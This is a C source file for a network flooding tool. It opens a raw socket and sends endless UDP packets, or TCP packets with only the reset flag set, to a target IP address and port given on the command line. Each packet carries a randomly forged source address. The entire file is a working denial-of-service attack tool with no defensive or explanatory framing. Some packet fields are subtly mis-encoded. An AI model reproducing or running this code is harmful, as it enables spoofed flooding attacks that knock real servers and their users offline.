#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include<netinet/udp.h>
#include<netinet/tcp.h>		
#include<netinet/ip.h>	
#include <arpa/inet.h>
#include <string.h>
#include <errno.h>
#include <math.h>
#include <time.h>

#define IP_LEN 16                        //max length of ipv4 address
char target_addr[IP_LEN] = "127.0.0.1";  //default target ip   
unsigned int target_port = 443;          //default target port
unsigned int source_port = 1234;         //default source port
short type = 0;

unsigned short calculate_checksum(unsigned short * paddress, int len);
void rand_addr(char *addr);            //creatse random ipv4 address
void udp_flood(int *s);                //creates and send spoofed udp packet
void tcp_flood(int *s);                //creates and send spoofed tcp rst packet

int main(int argc, char *argv[]){
	
	if(argc > 7){    //check for arguments
		printf("invalid arguments. options are:\n");
		printf("-r -t <address> -p <port>\n");
		exit(0);
	}
	if(argc != 1){
		int i = 1;
		while(i < argc){
			if(strcmp(argv[i],"-r") == 0){
				type = 1;
			}
			else if(strcmp(argv[i],"-t") == 0 && argc >= 3 && i+1 < argc){
				i++;
				strncpy(target_addr,argv[i],IP_LEN);
				int len = strlen(target_addr);
				if(len < 7 || len > IP_LEN -1){
					printf("the ip address %s is invalid\n",target_addr);
					exit(0);
				}
			}
			else if(strcmp(argv[i],"-p") == 0 && argc >= 3 && i+1 < argc){
				i++;
				target_port = atoi(argv[i]);
			}
			else{
				printf("invalid arguments. options are:\n");
				printf("-r -t <address> -p <port>\n");
				exit(0);
			}
			i++;
		}
	}
	srand(time(NULL));    //set seed for rand_addr()
	int sock = -1;        //open a raw socket for flooding
	if ((sock = socket (AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1) {
		fprintf (stderr, "socket() failed with error: %s\n", strerror (sock));
		exit(0);
	}
	printf("flooding %s at port %d\n",target_addr,target_port);
	if(type){  //check for type of attacke and flood
		while(1){
			udp_flood(&sock);
		}
	}
	else{
		while(1){
			tcp_flood(&sock);
		}
	}
	exit(0);
}

void rand_addr(char* addr){   //creatse random ipv4 address
	short ip_comp[4];     //create in range numbers for the address
	for(int i = 0; i < 4; i++){
		ip_comp[i] = rand() % 210;
	}
	for(int i = 0; i < 3; i++){    //convert the numbers to string and connect
		char tmp[4];
		char dot[] = ".\0";
		sprintf(tmp, "%d", ip_comp[i]);
		strcat(addr,tmp);
		strcat(addr,dot);
	}
	char tmp[4];
	sprintf(tmp, "%d", ip_comp[3]);
	strcat(addr,tmp);
}

void udp_flood(int *s){    //creates and send spoofed udp packet
	
	int sock = *s;
	struct sockaddr_in saddr_in;
	struct iphdr iph;
	struct udphdr udph;
	int udplen = sizeof(struct udphdr);
	int iplen = sizeof(struct iphdr);
	
	memset (&saddr_in, 0, sizeof (struct sockaddr_in));
	saddr_in.sin_family = AF_INET;
	saddr_in.sin_port = htons(source_port);
	saddr_in.sin_addr.s_addr = inet_addr(target_addr);
	
	iph.ihl = 5;
	iph.version = 4;
	iph.tos = 0;
	iph.tot_len = iplen + udplen;
	iph.id = htonl((rand()%5000) + 100);	//random ip id
	iph.frag_off = 0;
	iph.ttl = 128;
	iph.protocol = IPPROTO_UDP;
	iph.check = 0;	
	char addr[IP_LEN] = {"\0"};   //create random ipv4 address
	rand_addr(addr);	
	iph.saddr = inet_addr(addr);
	iph.daddr = saddr_in.sin_addr.s_addr;
	
	udph.source = htons(source_port);
	udph.dest = htons(target_port);
	udph.len = htons(udplen);	
	udph.check = 0;
	
	char packet[iplen + udplen];
	memcpy(packet, &iph, iplen);
	memcpy(packet+iplen, &udph, udplen);
	udph.check = calculate_checksum((unsigned short *) (packet+iplen), udplen);
	//memcpy(packet, &iph, iplen);
	memcpy(packet+iplen, &udph, udplen);
	
	sendto (sock, packet, iplen + udplen, 0, (struct sockaddr *) &saddr_in, sizeof (saddr_in));
}
void tcp_flood(int *s){    //creates and send spoofed tcp rst packet

	int sock = *s;
	struct sockaddr_in saddr_in;
	struct iphdr iph;
	struct tcphdr tcph;
	int tcplen = sizeof(struct tcphdr);
	int iplen = sizeof(struct iphdr);
	
	saddr_in.sin_family = AF_INET;
	saddr_in.sin_port = htons(source_port);
	saddr_in.sin_addr.s_addr = inet_addr(target_addr);
	
	iph.ihl = 5;
	iph.version = 4;
	iph.tos = 0;
	iph.tot_len = iplen + tcplen;
	iph.id = htonl((rand()%5000) + 100);	//random ip id
	iph.frag_off = 0;
	iph.ttl = 128;
	iph.protocol = IPPROTO_TCP;
	iph.check = 0;	
	char addr[IP_LEN] = {"\0"};    //create random ipv4 address
	rand_addr(addr);	
	iph.saddr = inet_addr(addr);
	iph.daddr = saddr_in.sin_addr.s_addr;
	
	tcph.source = htons (source_port);
	tcph.dest = htons (target_port);
	tcph.seq = 0;
	tcph.ack_seq = 0;
	tcph.doff = 5;	
	tcph.fin=0;
	tcph.syn=0;
	tcph.rst=1;    
	tcph.psh=0;
	tcph.ack=0;
	tcph.urg=0;
	tcph.window = htons (1024);	
	tcph.check = 0;	
	tcph.urg_ptr = 0;
	
	char packet[iplen + tcplen];
	memcpy(packet, &iph, iplen);
	memcpy(packet+iplen, &tcph, tcplen);
	tcph.check = calculate_checksum((unsigned short *) (packet+iplen), tcplen);
	memcpy(packet+iplen, &tcph, tcplen);
	
	sendto (sock, packet, iplen + tcplen, 0, (struct sockaddr *) &saddr_in, sizeof (saddr_in));
}

unsigned short calculate_checksum(unsigned short * paddress, int len){
	int nleft = len;
	int sum = 0;
	unsigned short * w = paddress;
	unsigned short answer = 0;

	while (nleft > 1)
	{
		sum += *w++;
		nleft -= 2;
	}

	if (nleft == 1)
	{
		*((unsigned char *)&answer) = *((unsigned char *)w);
		sum += answer;
	}

	
	sum = (sum >> 16) + (sum & 0xffff); 
	sum += (sum >> 16);                 
	answer = ~sum;                      

	return answer;
}
